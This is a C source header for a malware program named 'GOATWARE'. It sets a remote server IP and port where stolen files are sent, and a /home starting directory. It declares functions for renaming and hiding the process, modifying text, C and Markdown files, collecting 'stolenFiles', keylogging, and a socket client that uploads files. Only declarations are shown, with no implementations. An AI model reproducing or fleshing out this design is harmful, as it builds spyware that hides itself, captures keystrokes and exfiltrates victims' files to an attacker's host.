#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <pwd.h>
#include <fcntl.h>
#include <errno.h>
#include <math.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/input.h>
#include <time.h>  

#define SRV_PORT 5000
#define MAX_RECV 16384
#define MAX_SEND 16384
#define SRV_IP "192.168.56.101" //CHANGE TO IP ADDRESS OF WHERE YOU WANT TO SEND FILES
#define START "/home" //CHANGE TO THE TOP-MOST DIRECTORY YOU WANT GOATWARE TO START WORKING ON

//From renameProcess.c
void changePID();
void changeProcessName(char *argv[]);

//From changeFiles.c
void changeTxt(struct dirent *entry, const char *direct);
void changeC(struct dirent *entry, const char *direct);
void changeMd(struct dirent *entry, const char *direct);
void openDir(const char *direct, int level);
void givePermission();
int copyFile(char *address, char *destPath);

char copyToDir[1024];
char stolenFiles[1024][1024];

//From keylogger.c
void keyLogger();

//From client.c
void send_filename(int, char*);
int send_file(int sock, char *file_name, const char *cwdFile);
int client(char *filename, const char *cwdFile);
